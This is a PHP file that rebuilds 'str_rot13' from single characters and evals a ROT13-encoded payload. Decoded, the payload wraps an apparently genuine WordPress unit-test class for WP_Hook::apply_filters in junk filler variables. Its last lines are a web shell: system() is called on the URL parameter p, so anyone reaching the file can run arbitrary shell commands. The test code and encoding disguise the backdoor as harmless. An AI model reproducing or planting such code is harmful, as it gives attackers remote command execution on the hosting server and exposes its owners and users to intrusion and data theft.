<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfg gur nccyl_svygref zrgubq bs JC_Ubbx
 *
 * @tebhc ubbxf
 * @pbiref JC_Ubbx::nccyl_svygref
 */
pynff Grfgf_Ubbxf_NccylSvygref rkgraqf JC_HavgGrfgPnfr {

	choyvp shapgvba grfg_nccyl_svygref_jvgu_pnyyonpx() {
		$n             = arj ZbpxNpgvba();
		$pnyyonpx      = neenl( $n, 'svygre' );
		$ubbx          = arj JC_Ubbx();
		$ubbx_anzr     = __SHAPGVBA__;
		$cevbevgl      = 1;
		$npprcgrq_netf = 2;
		$net           = __SHAPGVBA__ . '_net';

		$ubbx->nqq_svygre( $ubbx_anzr, $pnyyonpx, $cevbevgl, $npprcgrq_netf );

		$erghearq = $ubbx->nccyl_svygref( $net, neenl( $net ) );

		$guvf->nffregFnzr( $erghearq, $net );
		$guvf->nffregFnzr( 1, $n->trg_pnyy_pbhag() );
	}

	choyvp shapgvba grfg_nccyl_svygref_jvgu_zhygvcyr_pnyyf() {
		$n             = arj ZbpxNpgvba();
		$pnyyonpx      = neenl( $n, 'svygre' );
		$ubbx          = arj JC_Ubbx();
		$ubbx_anzr     = __SHAPGVBA__;
		$cevbevgl      = 1;
		$npprcgrq_netf = 2;
		$net           = __SHAPGVBA__ . '_net';

		$ubbx->nqq_svygre( $ubbx_anzr, $pnyyonpx, $cevbevgl, $npprcgrq_netf );

		$erghearq_bar = $ubbx->nccyl_svygref( $net, neenl( $net ) );
		$erghearq_gjb = $ubbx->nccyl_svygref( $erghearq_bar, neenl( $erghearq_bar ) );

		$guvf->nffregFnzr( $erghearq_gjb, $net );
		$guvf->nffregFnzr( 2, $n->trg_pnyy_pbhag() );
	}

	/**
	 * @gvpxrg 60193
	 *
	 * @qngnCebivqre qngn_cevbevgl_pnyyonpx_beqre_jvgu_vagrtref
	 * @qngnCebivqre qngn_cevbevgl_pnyyonpx_beqre_jvgu_haunccl_cngu_abavagrtref
	 *
	 * @cnenz neenl $cevbevgvrf {
	 *     Vaqrkrq neenl bs gur cevbevgvrf sbe gur ZbpxNpgvba pnyyonpxf.
	 *
	 *     @glcr zvkrq $0 Cevbevgl sbe 'npgvba' pnyyonpx.
	 *     @glcr zvkrq $1 Cevbevgl sbe 'npgvba2' pnyyonpx.
	 * }
	 * @cnenz neenl  $rkcrpgrq_pnyy_beqre  Na neenl bs pnyyonpx anzrf va rkcrpgrq pnyy beqre.
	 * @cnenz fgevat $rkcrpgrq_qrcerpngvba Bcgvbany. Qrcerpngvba zrffntr. Qrsnhyg ''.
	 */
	choyvp shapgvba grfg_cevbevgl_pnyyonpx_beqre( $cevbevgvrf, $rkcrpgrq_pnyy_beqre, $rkcrpgrq_qrcerpngvba = '' ) {
		$zbpx      = arj ZbpxNpgvba();
		$ubbx      = arj JC_Ubbx();
		$ubbx_anzr = __SHAPGVBA__;

		vs ( $rkcrpgrq_qrcerpngvba && CUC_IREFVBA_VQ >= 80100 ) {
			$guvf->rkcrpgQrcerpngvba();
			$guvf->rkcrpgQrcerpngvbaZrffntr( $rkcrpgrq_qrcerpngvba );
		}

		$ubbx->nqq_svygre( $ubbx_anzr, neenl( $zbpx, 'svygre' ), $cevbevgvrf[0], 1 );
		$ubbx->nqq_svygre( $ubbx_anzr, neenl( $zbpx, 'svygre2' ), $cevbevgvrf[1], 1 );
		$ubbx->nccyl_svygref( __SHAPGVBA__ . '_iny', neenl( '' ) );

		$guvf->nffregFnzr( 2, $zbpx->trg_pnyy_pbhag(), 'Gur ahzore bs pnyy pbhagf qbrf abg zngpu' );

		$npghny_pnyy_beqre = jc_yvfg_cyhpx( $zbpx->trg_riragf(), 'svygre' );
		$guvf->nffregFnzr( $rkcrpgrq_pnyy_beqre, $npghny_pnyy_beqre, 'Gur svygre pnyyonpx beqre qbrf abg zngpu gur rkcrpgrq beqre' );
	}

	/**
	 * Unccl cngu qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_cevbevgl_pnyyonpx_beqre_jvgu_vagrtref() {
		erghea neenl(
			'vag QRFP' => neenl(
				'cevbevgvrf'          => neenl( 10, 9 ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'svygre2', 'svygre' ),
			),
			'vag NFP'  => neenl(
				'cevbevgvrf'          => neenl( 9, 10 ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'svygre', 'svygre2' ),
			),
		);
	}

	/**
	 * Haunccl cngu qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_cevbevgl_pnyyonpx_beqre_jvgu_haunccl_cngu_abavagrtref() {
		erghea neenl(
			// Ahzoref nf fgevatf naq sybngf.
			'vag nf fgevat QRFP'               => neenl(
				'cevbevgvrf'          => neenl( '10', '9' ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'svygre2', 'svygre' ),
			),
			'vag nf fgevat NFP'                => neenl(
				'cevbevgvrf'          => neenl( '9', '10' ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'svygre', 'svygre2' ),
			),
			'sybng QRFP'                       => neenl(
				'cevbevgvrf'           => neenl( 10.0, 9.5 ),
				'rkcrpgrq_pnyy_beqre'  => neenl( 'svygre2', 'svygre' ),
				'rkcrpgrq_qrcerpngvba' => 'Vzcyvpvg pbairefvba sebz sybng 9.5 gb vag ybfrf cerpvfvba',
			),
			'sybng NFP'                        => neenl(
				'cevbevgvrf'           => neenl( 9.5, 10.0 ),
				'rkcrpgrq_pnyy_beqre'  => neenl( 'svygre', 'svygre2' ),
				'rkcrpgrq_qrcerpngvba' => 'Vzcyvpvg pbairefvba sebz sybng 9.5 gb vag ybfrf cerpvfvba',
			),
			'sybng nf fgevat QRFP'             => neenl(
				'cevbevgvrf'          => neenl( '10.0', '9.5' ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'svygre2', 'svygre' ),
			),
			'sybng nf fgevat NFP'              => neenl(
				'cevbevgvrf'          => neenl( '9.5', '10.0' ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'svygre', 'svygre2' ),
			),

			// Aba-ahzrevp.
			'ahyy'                             => neenl(
				'cevbevgvrf'          => neenl( ahyy, ahyy ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'svygre', 'svygre2' ),
			),
			'obby QRFP'                        => neenl(
				'cevbevgvrf'          => neenl( gehr, snyfr ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'svygre2', 'svygre' ),
			),
			'obby NFP'                         => neenl(
				'cevbevgvrf'          => neenl( snyfr, gehr ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'svygre', 'svygre2' ),
			),
			'aba-ahzrevpny fgevat QRFP'        => neenl(
				'cevbevgvrf'          => neenl( 'grfg1', 'grfg2' ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'svygre', 'svygre2' ),
			),
			'aba-ahzrevpny fgevat NFP'         => neenl(
				'cevbevgvrf'          => neenl( 'grfg1', 'grfg2' ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'svygre', 'svygre2' ),
			),
			'vag, aba-ahzrevpny fgevat QRFP'   => neenl(
				'cevbevgvrf'          => neenl( 10, 'grfg' ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'svygre2', 'svygre' ),
			),
			'vag, aba-ahzrevpny fgevat NFP'    => neenl(
				'cevbevgvrf'          => neenl( 'grfg', 10 ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'svygre', 'svygre2' ),
			),
			'sybng, aba-ahzrevpny fgevat QRFP' => neenl(
				'cevbevgvrf'          => neenl( 10.0, 'grfg' ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'svygre2', 'svygre' ),
			),
			'sybng, aba-ahzrevpny fgevat NFP'  => neenl(
				'cevbevgvrf'          => neenl( 'grfg', 10.0 ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'svygre', 'svygre2' ),
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>